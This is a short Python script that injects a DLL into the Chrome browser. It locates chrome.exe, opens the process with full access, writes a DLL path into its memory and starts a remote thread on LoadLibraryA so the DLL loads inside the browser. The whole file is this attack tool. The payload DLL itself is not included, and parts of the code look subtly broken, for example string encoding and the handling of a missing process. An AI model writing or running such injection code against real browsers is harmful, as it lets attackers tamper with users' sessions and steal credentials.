import sys
from ctypes import *
import psutil


def get_pid_by_name(process_name):
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            return proc.pid


PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32
dll_path = R"C:\Users\user\source\repos\InjectedDLL\Debug\InjectedDLL.dll"

dll_len = len(dll_path)


while True:
    pid = get_pid_by_name('chrome.exe')

    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

    if h_process:
        arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
        written = c_int(0)
        kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

        thread_id = c_ulong(0)

        if kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
            print("Remote Thread with ID 0x%08x created." %(thread_id.value))
            sys.exit(0)
    else:
        print("Chrome not running!")
